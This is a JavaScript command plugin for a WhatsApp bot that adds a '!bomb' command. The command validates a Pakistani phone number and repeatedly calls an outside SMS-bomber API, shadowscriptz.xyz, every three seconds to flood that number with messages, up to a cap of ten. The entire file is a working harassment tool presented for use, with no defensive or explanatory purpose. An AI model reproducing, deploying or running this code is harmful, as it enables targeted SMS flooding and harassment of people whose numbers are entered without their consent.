const { cmd } = require('../command');
let isBombing = false;
let bombingInterval;

cmd({
    pattern: "bomb",
    react: "💣",
    desc: "Start/Stop SMS Bombing",
    category: "main",
    filename: __filename
}, async (conn, mek, m, { from, isOwner, text, reply }) => {
    if (!isOwner) return reply("❌ Owner only!");

    // STOP Bombing if active
    if (isBombing) {
        clearInterval(bombingInterval);
        isBombing = false;
        return reply("✅ Bombing stopped!");
    }

    // Extract Number (from command/reply/mention)
    let number = m.quoted?.sender || m.mentionedJid?.[0] || text.split(' ')[1];
    number = number?.replace('@s.whatsapp.net', '').replace(/[^0-9]/g, '');

    // Validate Pakistani Number
    if (!number || !number.startsWith('92') || number.length !== 11) {
        return reply("❌ Invalid PK number! Use: !bomb 923001234567");
    }

    // Start Bombing
    isBombing = true;
    let sentCount = 0;
    const maxSMS = 10; // Max 10 SMS
    reply(`💣 *Bombing Started!*\nNumber: ${number}\nMax SMS: ${maxSMS}`);

    bombingInterval = setInterval(async () => {
        if (!isBombing || sentCount >= maxSMS) {
            clearInterval(bombingInterval);
            isBombing = false;
            reply(`✅ Sent ${sentCount} SMS!`);
            return;
        }

        try {
            const apiUrl = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`;
            const response = await fetch(apiUrl);
            const result = await response.text();

            if (response.ok && result.includes("Success")) {
                sentCount++;
            } else {
                throw new Error(result || "API failed");
            }
        } catch (err) {
            console.error("Error:", err);
            clearInterval(bombingInterval);
            isBombing = false;
            reply(`❌ Failed: ${err.message}`);
        }
    }, 3000); // 3-second delay
});
